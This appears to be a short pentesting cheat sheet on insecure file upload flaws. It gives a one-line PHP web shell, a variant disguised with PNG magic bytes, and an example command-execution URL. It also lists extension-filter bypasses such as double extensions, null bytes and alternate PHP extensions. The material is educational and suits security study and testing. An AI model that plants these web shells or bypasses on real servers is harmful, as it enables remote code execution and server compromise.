## What is it?

Insecure File Upload vulnerability is when an application allows uncontrolled and unvalidated upload of files. An attacker can exploit this vulnerability to upload malicious files, like web shells, which can lead to code execution, data leakage, or other types of attacks.

**A simple example**

An application allows users to upload profile pictures without validating the file type and content, or without properly handling the file storage. An attacker can upload a PHP shell script disguised as an image file.

Using Burpsuite repeater:
``` Upload
<?php system($_GET['cmd']); ?>
```
```Magic Byte Upload
<> PNG
IHYskad783 <?php system($_GET['cmd']); ?>
```
```URL
http://<ip>/uploads/cmd.php?cmd=whoami
```
*Check HackTricks and PayloadAllThings for reverse shells*

When this file is served by the server, the malicious script can be executed.

The impact of insecure file uploads includes:
- Remote Code Execution (RCE)
- Data Leakage
- Server Compromise

## Exploitation

```
# Bypass extension filters
# Note: req server misconfig to execute or the ability to rename once it's up
shell.php.jpg

# Null byte injection
shell.php%00.jpg

# Blocklist bypass
shell.php5
shell.phtml

# Magic Bytes
head logo.png
<> PNG

```

---
 ## Valid php file extensions:

| Type       | Extension                                  |     |
| ---------- | ------------------------------------------ | --- |
| php        | phtml, .php, .php3, .php4, .php5, and .inc |     |
| asp        | asp, .aspx                                 |     |
| perl       | .pl, .pm, .cgi, .lib                       |     |
| jsp        | .jsp, .jspx, .jsw, .jsv, and .jspf         |     |
| Coldfusion | .cfm, .cfml, .cfc, .dbm                    |     |